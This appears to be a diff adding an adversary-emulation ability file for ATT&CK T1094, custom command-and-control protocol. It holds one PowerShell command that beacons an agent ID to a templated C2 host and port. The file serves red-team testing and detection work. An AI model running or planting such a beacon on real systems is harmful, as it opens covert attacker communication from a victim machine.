@@ -1,0 +1,14 @@
+- id: 959e86da-be5a-44f7-ad9a-7cb8b9dcd9ad
+  name: Custom Command and Control Protocol
+  description: Ability for Custom Command and Control Protocol (ATT&CK T1094). Generated
+    from Atomic Red Team procedures; review and test safely before use. [AUTO-INFERRED
+    SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1094
+    name: Custom Command and Control Protocol
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
